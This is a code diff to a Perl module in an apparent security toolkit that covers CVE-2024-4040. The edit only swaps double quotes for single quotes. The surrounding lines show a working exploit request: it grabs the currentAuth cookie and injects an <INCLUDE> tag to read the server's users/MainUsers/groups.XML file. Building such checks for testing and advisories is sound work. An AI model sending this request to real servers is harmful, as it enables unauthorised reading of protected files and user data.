@@ -11,7 +11,7 @@ package Spellbook::Advisory::CVE_2024_4040 {
         my ($self, $parameters) = @_;
         my ($target, $help, @result);
 
-        my $payload = "users/MainUsers/groups.XML";
+        my $payload = 'users/MainUsers/groups.XML';
 
         Getopt::Long::GetOptionsFromArray (
             $parameters,
@@ -36,11 +36,11 @@ package Spellbook::Advisory::CVE_2024_4040 {
             $cookie_jar -> extract_cookies($response);
             $cookie_jar -> save();
 
-            my $cookies = $response -> header("Set-Cookie");
+            my $cookies = $response -> header('Set-Cookie');
 
             if ($cookies =~ /currentAuth=([^;]+)/msx) {
                 $response = $user_agent -> post($endpoint,
-                    Content_Type => "application/x-www-form-urlencoded",
+                    Content_Type => 'application/x-www-form-urlencoded',
                     Content => "command=exists&paths=<INCLUDE>$payload</INCLUDE>&c2f=$1"
                 );
 
